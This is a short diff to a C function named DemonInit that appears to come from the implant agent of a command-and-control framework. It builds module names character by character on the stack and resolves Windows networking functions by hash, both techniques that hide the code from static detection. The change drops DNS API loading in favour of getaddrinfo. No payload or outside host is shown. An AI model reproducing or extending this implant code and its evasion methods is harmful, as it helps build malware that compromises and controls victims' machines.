@@ -637,15 +637,6 @@ VOID DemonInit( VOID )
     ModuleName[ 6 ] = 0;
     Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );
 
-    ModuleName[ 0 ] = 'D';
-    ModuleName[ 1 ] = 'n';
-    ModuleName[ 2 ] = 's';
-    ModuleName[ 3 ] = 'a';
-    ModuleName[ 4 ] = 'p';
-    ModuleName[ 5 ] = 'i';
-    ModuleName[ 6 ] = 0;
-    Instance.Modules.Dnsapi = LdrModuleLoad( ModuleName );
-
     ModuleName[ 0 ] = 's';
     ModuleName[ 7 ] = 0;
     ModuleName[ 1 ] = 's';
@@ -808,16 +799,9 @@ VOID DemonInit( VOID )
         Instance.Win32.recv         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_recv );
         Instance.Win32.send         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_send );
         Instance.Win32.connect      = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_connect );
+        Instance.Win32.getaddrinfo  = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_getaddrinfo );
 
         PUTS( "Loaded Ws2_32 functions" )
-    }
-
-    if ( Instance.Modules.Dnsapi )
-    {
-        Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, FuncHash_DnsQuery_A );
-        Instance.Win32.DnsFree    = LdrFunctionAddr( Instance.Modules.Dnsapi, FuncHash_DnsFree );
-
-        PUTS( "Loaded DnsApi functions" )
     }
 
     if ( Instance.Modules.Sspicli )
